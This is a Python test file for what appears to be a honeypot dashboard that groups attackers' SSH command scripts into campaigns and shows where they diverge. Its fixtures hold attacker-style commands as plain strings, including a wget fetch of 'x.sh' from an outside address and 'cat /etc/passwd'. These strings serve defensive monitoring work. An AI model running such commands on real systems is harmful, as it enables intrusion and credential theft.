# 0.39 Campaigns: rows whose scripts start alike show where they differ, and every script has a preview.
import unittest

from tests.helpers import app

IP = "203.0.113.139"
BASE = 1700000000


def wipe(con):
    with con:
        sids = [r[0] for r in con.execute("SELECT session FROM sessions WHERE ip=?", (IP,))]
        for s in sids:
            con.execute("DELETE FROM events WHERE session=?", (s,))
        con.execute("DELETE FROM sessions WHERE ip=?", (IP,))


class Diffs(unittest.TestCase):
    def test_first_differing_command(self):
        a = ["w", "ls -la", "uname -a", "cat /proc/cpuinfo"]
        b = ["w", "ls -la", "uname -a", "wget http://198.51.100.7/x.sh"]
        c = ["id", "whoami"]
        d = app.script_diffs([a, b, c])
        self.assertEqual(d[0], ("at", 4, "cat /proc/cpuinfo"))
        self.assertEqual(d[1], ("at", 4, "wget http://198.51.100.7/x.sh"))
        self.assertIsNone(d[2])                      # no other row starts like it

    def test_shorter_copy_ends(self):
        d = app.script_diffs([["w", "ls -la"], ["w", "ls -la", "uptime"]])
        self.assertEqual(d[0], ("ends", 2, None))
        self.assertEqual(d[1], ("at", 3, "uptime"))

    def test_same_shape_is_not_a_difference(self):
        # Only addresses differ in command 3, so (like the campaign itself) they part at command 4.
        a = ["w", "ls", "ping 198.51.100.1", "id"]
        b = ["w", "ls", "ping 198.51.100.2", "uptime"]
        self.assertEqual(app.script_diffs([a, b])[0], ("at", 4, "id"))

    def test_three_way(self):
        a = ["enable", "system", "shell", "sh", "a"]
        b = ["enable", "system", "shell", "sh", "b"]
        c = ["enable", "system", "linuxshell"]
        d = app.script_diffs([a, b, c])
        self.assertEqual(d[0][:2], ("at", 5))
        self.assertEqual(d[2], ("at", 3, "linuxshell"))


class Page(unittest.TestCase):
    def setUp(self):
        self.con = app.connect()
        wipe(self.con)
        scripts = {"s39a": ["w", "ls -la", "cat /etc/passwd", "<b>x</b>"], "s39b": ["w", "ls -la", "uname -m"]}
        with self.con:
            for i, (sid, cmds) in enumerate(scripts.items()):
                self.con.execute("INSERT INTO sessions(session, ip, start, end, proto, cmds, cmdhash) VALUES(?,?,?,?,?,?,?)",
                                 (sid, IP, BASE + i, BASE + i + 5, "ssh", len(cmds), app.script_hash(cmds)))
                for k, c in enumerate(cmds):
                    self.con.execute("INSERT INTO events(h, ts, ip, src, kind, session, a) VALUES(?,?,?,?,?,?,?)",
                                     ("h39-%s-%d" % (sid, k), BASE + i + k * 0.1, IP, "cowrie", "cmd", sid, c))

    def tearDown(self):
        wipe(self.con)

    def test_campaigns_show_difference_and_preview(self):
        html = app.v_campaigns({})
        self.assertIn("differs at command 3:</span> cat /etc/passwd", html)
        self.assertIn("differs at command 3:</span> uname -m", html)
        self.assertIn("Preview · 4 commands", html)
        self.assertIn('class="pv-l pv-d"><span class=pv-n>3</span>cat /etc/passwd', html)
        self.assertNotIn("<b>x</b>", html)             # attacker text is escaped in the preview
        self.assertIn("&lt;b&gt;x&lt;/b&gt;", html)


if __name__ == "__main__":
    unittest.main()
